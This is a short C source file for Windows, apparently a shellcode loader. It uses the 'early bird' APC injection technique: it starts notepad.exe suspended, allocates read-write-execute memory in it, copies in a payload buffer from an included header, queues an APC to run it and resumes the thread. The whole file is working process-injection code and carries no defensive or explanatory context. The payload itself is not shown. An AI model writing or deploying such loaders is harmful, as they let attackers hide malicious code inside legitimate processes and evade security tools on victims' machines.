#include <windows.h>
#include "../common/payload.h"
int main() {
    STARTUPINFOA si = { sizeof(si) }; PROCESS_INFORMATION pi = { 0 };
    CreateProcessA(0, "notepad.exe", 0, 0, FALSE, CREATE_SUSPENDED, 0, 0, &si, &pi);
    void *exec = VirtualAllocEx(pi.hProcess, 0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, exec, payload, payload_len, 0);
    QueueUserAPC((PAPCFUNC)exec, pi.hThread, 0);
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
    return 0;
}
